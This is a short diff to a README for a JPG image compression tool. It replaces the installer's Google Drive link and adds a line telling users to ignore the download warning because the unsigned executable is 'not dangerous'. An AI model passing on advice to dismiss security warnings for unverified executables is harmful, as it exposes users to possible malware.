@@ -28,10 +28,8 @@ In View options, Apply Best Fit will increase image preview quality by apply a s
 
 This currently only supports .JPG image files.
 
-The installer can be downloaded from this link https://drive.google.com/file/d/1Jee02JEiYA5mq21h_p7YR6k9aWNmeg2k/view?usp=sharing
-Extract the executable from the archive and run it to install.
-
-Please make a donation if you found this program usefull https://www.paypal.me/TurboImageCompressor
+The installer can be downloaded from this link https://drive.google.com/file/d/1Gh6SnPt8ks1C5eLjeiiic-AR-IENs4yE/view?usp=sharing
+Please ignore the warning, the file is not dangerous, it simply hasn't been signed yet or downloaded enough times.
 
 # License
 
